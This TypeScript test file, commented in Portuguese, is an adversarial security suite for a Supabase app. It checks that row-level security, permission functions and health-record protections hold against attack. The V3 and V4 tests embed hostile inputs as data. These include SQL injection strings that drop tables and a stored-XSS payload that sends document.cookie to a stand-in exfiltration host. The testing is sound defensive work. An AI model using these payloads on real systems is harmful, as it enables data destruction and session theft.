// ============================================================
// 11_adversarial_superficie.spec.ts — Portão de segurança adversarial
// (Subetapa 01.8), vetores 2, 3, 4 e 7:
//   V2 — acesso direto ao banco fora da camada de RLS
//   V3 — injeção de conteúdo malicioso (SQL, XSS armazenado, jsonb)
//   V4 — burla/reescrita de política de RLS
//   V7 — exposição indevida de dado pessoal (LGPD, foco em aba_health)
//
// Todo caso afirma o comportamento SEGURO — vermelho aqui é achado.
// ============================================================
import { describe, it, expect, afterAll } from "vitest";
import {
  adminClient,
  anonClient,
  clientAs,
  createThrowawayUser,
  deleteThrowawayUser,
  loadContext,
  ehErroRls,
  ehErroConstraintOuTrigger,
} from "./helpers";
import { createClient, type SupabaseClient } from "@supabase/supabase-js";
import { config } from "dotenv";
import path from "node:path";

config({ path: path.resolve(__dirname, "../../../.env") });
config({ path: path.resolve(__dirname, "../../.env.test") });

const SUPABASE_URL = process.env.SUPABASE__URL!;
const ANON_KEY = process.env.SUPABASE_ANON_KEY!;

async function signInAs(email: string, password: string): Promise<SupabaseClient> {
  const c = createClient(SUPABASE_URL, ANON_KEY, {
    auth: { autoRefreshToken: false, persistSession: false },
  });
  const { error } = await c.auth.signInWithPassword({ email, password });
  if (error) throw new Error(`signInAs(${email}): ${error.message}`);
  return c;
}

function ataqueBarrado(err: { code?: string | null; message?: string | null } | null): boolean {
  return ehErroRls(err) || ehErroConstraintOuTrigger(err);
}

const limpeza: Array<() => Promise<void>> = [];
afterAll(async () => {
  for (const fn of limpeza.reverse()) {
    try {
      await fn();
    } catch (e) {
      console.warn("limpeza adversarial falhou:", (e as Error).message);
    }
  }
});

// Tabelas representativas de cada schema exposto ao PostgREST.
const SUPERFICIE: Array<{ schema: string; tabela: string }> = [
  { schema: "public", tabela: "accounts" },
  { schema: "public", tabela: "profiles" },
  { schema: "public", tabela: "api_keys" },
  { schema: "public", tabela: "webhook_endpoints" },
  { schema: "access", tabela: "module_permissions" },
  { schema: "licensing", tabela: "account_limits" },
  { schema: "aba_people", tabela: "pessoas" },
  { schema: "aba_catalog", tabela: "servicos" },
  { schema: "aba_scheduling", tabela: "agendamentos" },
  { schema: "aba_finance", tabela: "faturas" },
  { schema: "aba_health", tabela: "prontuarios" },
  { schema: "aba_health", tabela: "evolucoes" },
  { schema: "aba_health", tabela: "log_acesso" },
  { schema: "aba_messaging", tabela: "mensagens" },
  { schema: "aba_sales", tabela: "oportunidades" },
  { schema: "aba_automations", tabela: "automacoes" },
  { schema: "aba_ai", tabela: "ia_configuracoes" },
];

// ============================================================
// V2 — acesso fora da camada de RLS
// ============================================================
describe("V2 — acesso direto fora da RLS", () => {
  it("anon não lê NENHUMA tabela de NENHUM schema", async () => {
    const anon = anonClient();
    const vazamentos: string[] = [];

    for (const { schema, tabela } of SUPERFICIE) {
      const q = schema === "public" ? anon.from(tabela) : anon.schema(schema).from(tabela);
      const { data, error } = await q.select("*").limit(1);
      if (!error && (data ?? []).length > 0) {
        vazamentos.push(`${schema}.${tabela} devolveu ${data!.length} linha(s)`);
      }
    }

    expect(vazamentos, `anon leu dado: ${vazamentos.join(" | ")}`).toEqual([]);
  });

  it("anon não escreve em NENHUMA tabela", async () => {
    const anon = anonClient();
    const ctx = await loadContext();
    const vazamentos: string[] = [];

    for (const { schema, tabela } of SUPERFICIE) {
      const q = schema === "public" ? anon.from(tabela) : anon.schema(schema).from(tabela);
      const { error } = await q.insert({ account_id: ctx.accountId } as never).select("*");
      if (!error) vazamentos.push(`${schema}.${tabela} aceitou INSERT anônimo`);
    }

    expect(vazamentos, `anon escreveu: ${vazamentos.join(" | ")}`).toEqual([]);
  });

  it("anon não executa RPC alguma, nem a função de plataforma exposta", async () => {
    const anon = anonClient();
    const rpcs: Array<[string, Record<string, unknown>]> = [
      ["rls_auto_enable", {}],
      ["is_account_member", { target_account_id: "00000000-0000-0000-0000-000000000000" }],
      ["touch_presence", { p_status: "online" }],
    ];

    for (const [nome, args] of rpcs) {
      const { data, error } = await anon.rpc(nome, args);
      expect(error !== null || data === null, `anon executou ${nome} com sucesso (data: ${JSON.stringify(data)})`).toBe(true);
    }
  });

  it("authenticated não chama função interna de trigger por RPC", async () => {
    const owner = await clientAs("owner");
    const internas = [
      { schema: "aba_finance", fn: "recalcular_valor_fatura" },
      { schema: "aba_finance", fn: "marcar_faturas_vencidas" },
      { schema: "aba_finance", fn: "expirar_planos" },
      { schema: "aba_health", fn: "registrar_escrita_clinica" },
      { schema: "aba_scheduling", fn: "carimbar_conclusao" },
    ];

    for (const { schema, fn } of internas) {
      const { error } = await owner.schema(schema).rpc(fn);
      expect(error, `${schema}.${fn} foi executável por authenticated`).not.toBeNull();
    }
  });

  it("a service role key não está no bundle do client (só a anon key)", async () => {
    const { readFileSync } = await import("node:fs");
    const raiz = path.resolve(__dirname, "../../..");
    const env = readFileSync(path.join(raiz, ".env"), "utf-8");

    const linhasVite = env
      .split(/\r?\n/)
      .filter((l) => l.startsWith("VITE_"))
      .map((l) => l.split("=")[0]);

    // Só nomes de variável entram na asserção — nunca o valor.
    expect(linhasVite, "variável VITE_* de service role exposta ao browser").not.toContain("VITE_SUPABASE_SERVICE_ROLE_KEY");
    expect(linhasVite.some((n) => /SERVICE_ROLE/i.test(n))).toBe(false);
  });
});

// ============================================================
// V4 — burlar ou reescrever política de RLS
// ============================================================
describe("V4 — burla/reescrita de política", () => {
  it("não existe RPC de execução de SQL arbitrário exposta", async () => {
    const owner = await clientAs("owner");
    const candidatos = ["exec_sql", "execute_sql", "run_sql", "query", "sql", "eval"];

    for (const nome of candidatos) {
      const { error } = await owner.rpc(nome, { query: "SELECT 1" } as never);
      expect(error, `RPC de SQL arbitrário encontrada: ${nome}`).not.toBeNull();
    }
  });

  it("access.can é fail-closed para entrada inválida ou hostil", async () => {
    const agent = await clientAs("agent");
    const hostis: Array<[string | null, string | null]> = [
      ["health", "read"],
      ["health'; DROP TABLE aba_health.prontuarios; --", "read"],
      ["people", "read'--"],
      [null, "read"],
      ["people", null],
      ["*", "*"],
    ];

    for (const [mod, acao] of hostis) {
      const { data, error } = await agent.rpc("can", { p_module_key: mod, p_action: acao } as never);
      // Chamada no schema access — via .schema('access')
      const { data: d2 } = await agent.schema("access").rpc("can", { p_module_key: mod, p_action: acao } as never);
      const permitido = d2 === true || data === true;
      expect(permitido, `access.can autorizou entrada hostil (${mod} / ${acao})`).toBe(false);
      void error;
    }
  });

  it("não-owner não grava interruptor de permissão (nem pela RPC)", async () => {
    const admin = await clientAs("admin");

    const { error: rpcErr } = await admin.schema("access").rpc("set_module_permission", {
      p_role: "viewer",
      p_module_key: "health",
      p_action: "read",
      p_allowed: true,
    } as never);
    expect(rpcErr, "admin gravou interruptor de permissão pela RPC").not.toBeNull();

    const ctx = await loadContext();
    const { error: insErr } = await admin
      .schema("access")
      .from("module_permissions")
      .insert({ account_id: ctx.accountId, role: "viewer", module_key: "health", action: "read", allowed: true })
      .select("id");
    expect(ataqueBarrado(insErr), "admin inseriu interruptor direto na tabela").toBe(true);
  });

  it("owner não concede a si mesmo permissão sobre conta alheia", async () => {
    const admin = adminClient();
    const vitima = await createThrowawayUser(admin, "adv-perm");
    limpeza.push(() => deleteThrowawayUser(admin, vitima.userId));

    const { data: perfilVitima } = await admin
      .from("profiles")
      .select("account_id")
      .eq("user_id", vitima.userId)
      .single();

    const owner = await clientAs("owner");
    const { data, error } = await owner
      .schema("access")
      .from("module_permissions")
      .insert({
        account_id: perfilVitima!.account_id, // conta alheia
        role: "viewer",
        module_key: "health",
        action: "read",
        allowed: true,
      })
      .select("id");

    expect(
      (error !== null && ataqueBarrado(error)) || (data ?? []).length === 0,
      `owner gravou permissão em conta alheia (data: ${JSON.stringify(data)}, erro: ${JSON.stringify(error)})`,
    ).toBe(true);
  });

  it("catálogo de módulos (access.modules) é somente leitura para todo papel", async () => {
    const owner = await clientAs("owner");

    const { error: insErr } = await owner
      .schema("access")
      .from("modules")
      .insert({ key: "adv_backdoor", label: "Backdoor", position: 99 })
      .select("id");
    expect(ataqueBarrado(insErr), "owner inseriu módulo novo no catálogo").toBe(true);

    const { data: updData, error: updErr } = await owner
      .schema("access")
      .from("modules")
      .update({ key: "health_desativado" })
      .eq("key", "health")
      .select("id");
    expect(
      (updErr !== null && ataqueBarrado(updErr)) || (updData ?? []).length === 0,
      "owner renomeou a chave do módulo health (desarmaria access.can)",
    ).toBe(true);
  });
});

// ============================================================
// V3 — injeção
// ============================================================
describe("V3 — injeção de conteúdo malicioso", () => {
  it("busca textual de IA não quebra nem injeta com sintaxe hostil de tsquery", async () => {
    const ctx = await loadContext();
    const owner = await clientAs("owner");

    const payloads = [
      "'; DROP TABLE aba_ai.ia_documentos_conhecimento; --",
      "a & | ! ( ) <-> :*",
      "'''''",
      "\\",
      "x' OR '1'='1",
      "%",
      " ",
    ];

    for (const p of payloads) {
      const { error } = await owner.schema("aba_ai").rpc("buscar_conhecimento_textual", {
        p_account_id: ctx.accountId,
        p_consulta: p,
        p_limite: 5,
      } as never);
      // Pode devolver vazio ou erro de sintaxe de tsquery; o que não
      // pode é executar o SQL injetado.
      void error;
    }

    // A tabela alvo da injeção continua existindo e consultável.
    const { error: sobreviveu } = await owner
      .schema("aba_ai")
      .from("ia_documentos_conhecimento")
      .select("id")
      .limit(1);
    expect(ehErroRls(sobreviveu) || sobreviveu === null, "tabela alvo sumiu após payload de injeção").toBe(true);
  });

  it("payload hostil em coluna texto é armazenado inerte (dado, nunca código)", async () => {
    const ctx = await loadContext();
    const owner = await clientAs("owner");

    const xss = `<script>fetch('https://exfil.invalido?c='+document.cookie)</script>`;
    const { data: pessoa, error } = await owner
      .schema("aba_people")
      .from("pessoas")
      .insert({ account_id: ctx.accountId, nome_exibicao: xss })
      .select("id, nome_exibicao")
      .single();

    if (pessoa?.id) {
      limpeza.push(async () => {
        await adminClient().schema("aba_people").from("pessoas").delete().eq("id", pessoa.id);
      });
      // O banco guarda o texto literal, sem interpretar — a defesa de
      // XSS é da renderização (Etapa 02). Aqui provamos que nada é
      // executado nem transformado no armazenamento.
      expect(pessoa.nome_exibicao).toBe(xss);
    }
    expect(error === null || ataqueBarrado(error)).toBe(true);
  });

  it("jsonb hostil não corrompe nem escapa da coluna", async () => {
    const ctx = await loadContext();
    const admin = adminClient();

    // Profundidade + chave gigante + caracteres de escape.
    let profundo: Record<string, unknown> = { fim: true };
    for (let i = 0; i < 200; i++) profundo = { [`n${i}`]: profundo };

    const hostil = {
      "chave'; DROP TABLE aba_messaging.mensagens; --": "x",
      "aspas\"duplas": "'; SELECT 1; --",
      grande: "A".repeat(50000),
      profundo,
    };

    const { data, error } = await admin
      .schema("aba_messaging")
      .from("eventos_provedor")
      .insert({ account_id: ctx.accountId, provedor: "meta", tipo_evento: "adv", payload: hostil })
      .select("id")
      .single();

    if (data?.id) {
      limpeza.push(async () => {
        await admin.schema("aba_messaging").from("eventos_provedor").delete().eq("id", data.id);
      });
    }

    // A tabela que a injeção tentou derrubar continua de pé.
    const { error: sobreviveu } = await admin.schema("aba_messaging").from("mensagens").select("id").limit(1);
    expect(sobreviveu, "tabela mensagens sumiu após payload jsonb hostil").toBeNull();
    void error;
  });
});

// ============================================================
// V7 — exposição indevida de dado pessoal (LGPD / aba_health)
// ============================================================
describe("V7 — dado pessoal e prontuário", () => {
  it("agent sem concessão não lê prontuário por nenhum dos caminhos de leitura", async () => {
    const agent = await clientAs("agent");
    const admin = adminClient();

    const { data: cliente } = await admin.schema("aba_people").from("clientes").select("id").limit(1).maybeSingle();
    if (!cliente?.id) return;

    for (const fn of ["ler_prontuario", "ler_evolucoes", "ler_respostas_anamnese", "ler_consentimentos"]) {
      const { data } = await agent.schema("aba_health").rpc(fn, { p_cliente_id: cliente.id } as never);
      expect((data ?? []).length, `${fn} devolveu conteúdo clínico a agent sem concessão`).toBe(0);
    }
  });

  it("coluna clínica não é legível direto na tabela (leitura sem log é impossível)", async () => {
    const owner = await clientAs("owner");

    const { error: e1 } = await owner
      .schema("aba_health")
      .from("prontuarios")
      .select("alergias, medicamentos, condicoes_cronicas")
      .limit(1);
    const { error: e2 } = await owner
      .schema("aba_health")
      .from("evolucoes")
      .select("avaliacao, notas_procedimento, resultado")
      .limit(1);

    expect(ehErroRls(e1), `coluna clínica de prontuarios legível sem log (erro: ${JSON.stringify(e1)})`).toBe(true);
    expect(ehErroRls(e2), `coluna clínica de evolucoes legível sem log (erro: ${JSON.stringify(e2)})`).toBe(true);
  });

  it("embedding do PostgREST não contorna o bloqueio de coluna clínica", async () => {
    const owner = await clientAs("owner");

    // Tenta puxar conteúdo clínico de carona numa relação permitida.
    const { data, error } = await owner
      .schema("aba_health")
      .from("prontuarios")
      .select("id, evolucoes(avaliacao, notas_procedimento)")
      .limit(1);

    const vazou =
      !error &&
      (data ?? []).some((l) => {
        const evs = (l as { evolucoes?: Array<{ avaliacao?: string | null; notas_procedimento?: string | null }> })
          .evolucoes ?? [];
        return evs.some((e) => e.avaliacao != null || e.notas_procedimento != null);
      });

    expect(vazou, "conteúdo clínico vazou por embedding de relação").toBe(false);
  });

  it("log de acesso clínico não pode ser apagado nem reescrito", async () => {
    const owner = await clientAs("owner");
    const admin = adminClient();
    const ctx = await loadContext();

    const { data: cliente } = await admin.schema("aba_people").from("clientes").select("id").limit(1).maybeSingle();
    if (!cliente?.id) return;

    const { data: linha } = await admin
      .schema("aba_health")
      .from("log_acesso")
      .insert({
        account_id: ctx.accountId,
        cliente_id: cliente.id,
        usuario_ator_id: ctx.userIds.owner,
        tipo_registro: "prontuario",
        acao: "leitura",
      })
      .select("id")
      .single();

    if (!linha?.id) return;
    limpeza.push(async () => {
      await admin.schema("aba_health").from("log_acesso").delete().eq("id", linha.id);
    });

    const { data: upd, error: updErr } = await owner
      .schema("aba_health")
      .from("log_acesso")
      .update({ acao: "adulterado" })
      .eq("id", linha.id)
      .select("id");
    const { data: del, error: delErr } = await owner
      .schema("aba_health")
      .from("log_acesso")
      .delete()
      .eq("id", linha.id)
      .select("id");

    expect(
      (updErr !== null && ataqueBarrado(updErr)) || (upd ?? []).length === 0,
      "log de acesso foi reescrito",
    ).toBe(true);
    expect(
      (delErr !== null && ataqueBarrado(delErr)) || (del ?? []).length === 0,
      "log de acesso foi apagado",
    ).toBe(true);
  });

  it("membro não forja linha de log em nome de outro usuário", async () => {
    const ctx = await loadContext();
    const agent = await clientAs("agent");
    const admin = adminClient();

    const { data: cliente } = await admin.schema("aba_people").from("clientes").select("id").limit(1).maybeSingle();
    if (!cliente?.id) return;

    const { data, error } = await agent
      .schema("aba_health")
      .from("log_acesso")
      .insert({
        account_id: ctx.accountId,
        cliente_id: cliente.id,
        usuario_ator_id: ctx.userIds.owner, // atribuindo o acesso a OUTRO usuário
        tipo_registro: "prontuario",
        acao: "leitura",
      })
      .select("id");

    if (data && data.length > 0) {
      limpeza.push(async () => {
        await admin.schema("aba_health").from("log_acesso").delete().eq("id", data[0].id);
      });
    }

    expect(
      (error !== null && ataqueBarrado(error)) || (data ?? []).length === 0,
      "agent forjou entrada de log atribuída a outro usuário",
    ).toBe(true);
  });

  it("dado pessoal não atravessa a fronteira de conta por embedding entre schemas", async () => {
    const admin = adminClient();
    const invasor = await createThrowawayUser(admin, "adv-lgpd");
    limpeza.push(() => deleteThrowawayUser(admin, invasor.userId));

    const sessao = await signInAs(invasor.email, invasor.password);

    // Desde a Subetapa 02.2, todo profile nasce com uma pessoa/funcionário
    // próprios (trigger aba_people.nascer_funcionario_do_perfil) — a
    // conta pessoal do invasor não está mais vazia em aba_people.pessoas,
    // tem exatamente 1 linha: ele mesmo. Isso é dado LEGÍTIMO da própria
    // conta, não vazamento — a checagem de segurança real é "nenhuma
    // linha de OUTRA conta aparece", não "zero linhas".
    const { data: perfilInvasor } = await admin.from("profiles").select("account_id").eq("user_id", invasor.userId).single();
    const contaInvasor = perfilInvasor!.account_id;

    const { data: pessoasEmbed } = await sessao.schema("aba_people").from("pessoas").select("*, clientes(*)").limit(5);
    for (const row of (pessoasEmbed ?? []) as Array<{ account_id: string }>) {
      expect(row.account_id, "pessoa de OUTRA conta apareceu via embedding").toBe(contaInvasor);
    }

    const tentativas: Array<() => Promise<{ data: unknown[] | null }>> = [
      async () => await sessao.schema("aba_sales").from("oportunidades").select("*, pessoas(*)").limit(5),
      async () => await sessao.schema("aba_messaging").from("conversas").select("*, mensagens(*)").limit(5),
      async () => await sessao.schema("aba_finance").from("faturas").select("*, clientes(*)").limit(5),
    ];

    for (const t of tentativas) {
      const { data } = await t();
      expect((data ?? []).length, "usuário de outra conta enxergou dado pessoal por embedding").toBe(0);
    }
  });
});
